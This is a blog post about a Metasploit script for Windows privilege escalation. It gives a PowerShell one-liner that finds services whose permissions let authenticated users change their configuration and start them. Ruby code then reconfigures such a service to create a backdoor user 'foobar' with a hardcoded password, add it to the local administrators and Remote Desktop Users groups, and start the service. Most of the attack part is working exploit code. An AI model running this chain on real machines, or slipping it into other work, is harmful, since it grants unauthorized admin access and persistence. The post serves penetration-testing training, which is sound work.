---
title: "Identify Weak Service Configuration With One Liner of Powershell"
date: 2021-12-03T09:48:14Z
categories: ["Programming", "Security"]
tags: ["Powershell", "Ruby",  "Metasploit", "Privilege Escalation"]
---

One of the features of PEN300 MSF script is lazy privilege escalation, it checks for few common excessive permissions and lack of configuration in certain component of the box.  
The missing part was how to identify weak service configuration? the approach was already known, however how to achieve it using MSF Ruby API or Win32 API seemed doomed. 
MSF Windows Services class relies on sc_manager, this won't work with low privileged user. I have also tried to call the API using railgun and change paramter flags to query only the configuration but seemed to not work either. I didn't dig deeper, I might have missed something.  
The last option remaining is the use sdshow parameter of sc.exe  and grab the output then parse it. The first idea that I had is to use ruby API to walk through all the services in the box and construct an array for each SDDL and then parse it to look for the weak configuration. This approach is doable but not practical because it takes so much time to complete around 20-30 minutes and that's due how channels work in MSF, in short running a command line for each service from ruby API is not good idea in this case.
After doing some thinking, I remembered that PrivsChecks does a loads of checks in much short of time so I decided to use Powershell for the heavy lifting.  

```POWERSHELL
 get-service | foreach($_) { 
 $n = $_.Name;
 $o = sc.exe sdshow $n; $m ="$o" -match 'A;;([A-Z]+);;;AU';
 if($m -eq $True){ 
 	$d = $Matches[1];
	if($d.contains('DC') -and $d.contains('RP')){"$n"} 
	} 
}
```

The one liner is quite simple, walk through all the services, capture sdshow output into a variable, then filter the output using this regex `A;;([A-Z]+);;;AU` which, means gets allow SD that `allow (A) authenticated user (AU) to do actions on this servicer ([A-Z]+)`.   
From there we check for `DC` which, means change service config and we also we check for `RP` permissions, which means start the service. We look for only this two permissions because with these ones we can exploit the service.  

![lab_test](/images/WeakServicePowershellOneLiner/lab.png)

The implementation with MSF script is quite simple now, we just need to invoke our Powershell class help that we created last time and execute the script, however, there is a tiny caveat here, we are expecting only on returned value but in some environment we could have more but what are the odds? for now just keep it that way.  

```ruby
def start_windows_services_privscheck
	print_status("\tChecking for weak configuration services")
	begin
		# Currently check only for weak configuration (RP and DC).
		# PrivescCheck will conver full test in paralel.
		service = $powershell.execute_command("get-service | foreach($_) { $n = $_.Name; $o = sc.exe sdshow $n; $m =\"$o\" -match 'A;;([A-Z]+);;;AU'; if($m -eq $True){ $d = $Matches[1]; if($d.contains('DC') -and $d.contains('RP')){\"$n\"} } }")
		service.strip!
		return unless !service.empty? || !service.nil?
		do_exploit_weak_conf_service(service)
	rescue Exception => e
		print_error("Lazy Windows Service Exploitation error: #{e}")
	end
end
```

The function do_exploit_weak_conf_service() simply creates a new local admin user part of remote desktop top users for insurance. 

```ruby
def do_exploit_weak_conf_service(service_name)
	commands = [
	'net user foobar Password123! /add',
	'net localgroup administrators foobar /add',
	'net localgroup \"Remote Desktop Users\" foobar /add'
	]
	path = 'C:\\Windows\\System32\\cmd.exe'
	arg = "/c sc config #{service_name} binpath= \"#{commands[0]}\""
	arg1 = "/c sc config #{service_name} start= demand"
	arg2 = "/c sc config #{service_name} obj= \".\\LocalSystem\" password= \"\""
	arg3 = "/c sc start #{service_name}"
	cmd_output = cmd_exec(path, arg)
	if cmd_output.include? 'SUCCESS'
		print_good("\t\t[#{service_name}] can be configured by current user")
		# Setting start to demand.
		# Since changing binpath was a success
		# No need to check for start= demand return value
		cmd_exec(path, arg1)
		# Same goes for obj and passwords parameters.
		cmd_exec(path, arg2)
		# Create user
		cmd_exec(path, arg)
		# Starting the service
		cmd_output = cmd_exec(path, arg3)
		if cmd_output.include? 'not respond to the start'
			print_good("\t\t[#{service_name}] New local user is created foobar:Password123!")
			1.upto(2) do |i|
				arg = "/c sc config #{service_name} binpath= \"#{commands[i]}\""
				cmd_exec(path, arg)
				cmd_exec(path, arg3)
			end
			print_good("\t\t[#{service_name}] Hacker has been added to local administrators and remote desktop users!")
		end
	end
end
```

That's it folks! a quick and dirty hack to identify an excessive permissions on a Windows service!

References:
- https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Post/Windows/Services
- https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/meterpreter/railgun-api-extension
- https://tahadraidia.com/posts/write-a-class-helper-for-metasploit-powershell-extension/
- https://tahadraidia.com/posts/build-an-atomic-windows-lab/
- https://www.winhelponline.com/blog/view-edit-service-permissions-windows/